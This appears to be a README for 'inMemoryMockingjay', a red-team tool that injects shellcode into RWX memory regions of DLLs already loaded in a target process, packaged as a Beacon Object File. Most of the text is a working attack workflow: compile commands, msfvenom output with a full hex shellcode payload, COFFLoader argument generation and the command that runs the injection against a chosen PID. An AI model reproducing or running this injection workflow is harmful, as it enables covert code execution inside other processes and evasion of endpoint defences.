# inMemoryMockingJay
Process Mockingjay: Echoing RWX In Userland To Achieve Code Execution

The motivation came from the following article and github projects:

https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution

https://github.com/pwnsauc3/RWXfinder/blob/main/rwxfinder.c

Instead of looking for dlls with RWX perms on disk, inMemoryMockingjay checks for the loaded dlls in process memory and if rwx perms are found it injects our shellcode in there.

Ideally CreateRemoteThread should not be called but that doesn't guarantee that our shellcode will run.

To run the code simply provide the PID of the remote process as shown below.
```
int main()
{
    inMemoryMockingjay(21196); 
    return 1;

}
```
------
# BOF
Template used - https://github.com/boku7/injectAmsiBypass
## Compiling:
Compilation with mingw was causing reliability issues. 
```
cl.exe /c /GS- mockingjayBOF.c /mockingjayBOF.o
```

## Testing:
Get shellcode in a hex string format. Example:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom  -f hex -p windows/x64/exec cmd=calc                        

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 272 bytes
Final size of hex file: 544 bytes
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300

```


Generate arguments for the BOF using COFFLoader's beacon_generate.py script.
https://github.com/trustedsec/COFFLoader
```
PS C:\Users\xxxxx\Desktop\COFFLoader-main> python3 .\beacon_generate.py
Beacon Argument Generator
Beacon>addint 4566
Beacon>addString fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300
Beacon>generate
b'29020000d6110000210200006663343838336534663065386330303030303030343135313431353035323531353634383331643236353438386235323630343838623532313834383862353232303438386237323530343830666237346134613464333163393438333163306163336336313763303232633230343163316339306434313031633165326564353234313531343838623532323038623432336334383031643038623830383830303030303034383835633037343637343830316430353038623438313834343862343032303439303164306533353634386666633934313862333438383438303164363464333163393438333163306163343163316339306434313031633133386530373566313463303334633234303834353339643137356438353834343862343032343439303164303636343138623063343834343862343031633439303164303431386230343838343830316430343135383431353835653539356134313538343135393431356134383833656332303431353266666530353834313539356134383862313265393537666666666666356434386261303130303030303030303030303030303438386438643031303130303030343162613331386236663837666664356262663062356132353634316261613639356264396466666435343838336334323833633036376330613830666265303735303562623437313337323666366130303539343138396461666664353633363136633633303000'
Beacon>
```

Run it:

```
.\COFFLoader64.exe go C:\Users\xxxxx\Desktop\bofs\mockingjayBOF\mockingJ.o '29020000d6110000210200006663343838336534663065386330303030303030343135313431353035323531353634383331643236353438386235323630343838623532313834383862353232303438386237323530343830666237346134613464333163393438333163306163336336313763303232633230343163316339306434313031633165326564353234313531343838623532323038623432336334383031643038623830383830303030303034383835633037343637343830316430353038623438313834343862343032303439303164306533353634386666633934313862333438383438303164363464333163393438333163306163343163316339306434313031633133386530373566313463303334633234303834353339643137356438353834343862343032343439303164303636343138623063343834343862343031633439303164303431386230343838343830316430343135383431353835653539356134313538343135393431356134383833656332303431353266666530353834313539356134383862313265393537666666666666356434386261303130303030303030303030303030303438386438643031303130303030343162613331386236663837666664356262663062356132353634316261613639356264396466666435343838336334323833633036376330613830666265303735303562623437313337323666366130303539343138396461666664353633363136633633303000' 
```




